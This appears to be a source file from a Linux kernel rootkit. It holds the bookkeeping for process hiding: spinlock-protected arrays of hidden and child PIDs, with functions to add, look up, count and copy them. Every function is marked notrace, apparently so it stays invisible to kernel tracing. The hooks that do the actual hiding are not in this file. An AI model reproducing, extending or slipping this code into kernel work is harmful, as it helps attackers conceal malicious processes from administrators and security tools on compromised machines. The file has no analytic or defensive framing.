#include "../include/core.h"
#include "../include/hidden_pids.h"

int child_pids[MAX_HIDDEN_PIDS*128];
int hidden_pids[MAX_HIDDEN_PIDS];
int hidden_count = 0;
int child_count = 0;
static DEFINE_SPINLOCK(hidden_pids_lock);

notrace int hidden_pid_count(void)
{
    unsigned long flags;
    int count;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    count = hidden_count;
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    return count;
}

notrace int child_pid_count(void)
{
    unsigned long flags;
    int count;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    count = child_count;
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    return count;
}

notrace int hidden_pids_snapshot(int *dst, int max_entries)
{
    unsigned long flags;
    int n;

    if (!dst || max_entries <= 0)
        return 0;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    n = hidden_count;
    if (n > MAX_HIDDEN_PIDS)
        n = MAX_HIDDEN_PIDS;
    if (n > max_entries)
        n = max_entries;
    if (n > 0)
        memcpy(dst, hidden_pids, n * sizeof(int));
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    return n;
}

notrace int child_pids_snapshot(int *dst, int max_entries)
{
    unsigned long flags;
    int n;

    if (!dst || max_entries <= 0)
        return 0;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    n = child_count;
    if (n > MAX_CHILD_PIDS)
        n = MAX_CHILD_PIDS;
    if (n > max_entries)
        n = max_entries;
    if (n > 0)
        memcpy(dst, child_pids, n * sizeof(int));
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    return n;
}

notrace void add_child_pid(int pid) {
    unsigned long flags;
    int i;

    if (pid <= 0)
        return;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < child_count; i++) {
        if (child_pids[i] == pid)
            goto out;
    }

    if (child_count < MAX_HIDDEN_PIDS*128)
        child_pids[child_count++] = pid;
out:
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

notrace int is_child_pid(int pid) {
    unsigned long flags;
    int i;
    int found = 0;

    if (pid <= 0)
        return 0;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < child_count; i++) {
         if (child_pids[i] == pid)
             found = 1;
         if (found)
             break;
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    return found;
}

notrace void add_hidden_pid(int pid) {
    unsigned long flags;
    int i;

    if (pid <= 0)
        return;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; i++) {
         if (hidden_pids[i] == pid)
             goto out;
    }

    if (hidden_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_count++] = pid;
    }
out:
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

notrace int is_hidden_pid(int pid) {
    unsigned long flags;
    int i;
    int found = 0;

    if (pid <= 0)
        return 0;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; i++) {
         if (hidden_pids[i] == pid)
             found = 1;
         if (found)
             break;
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    return found;
}
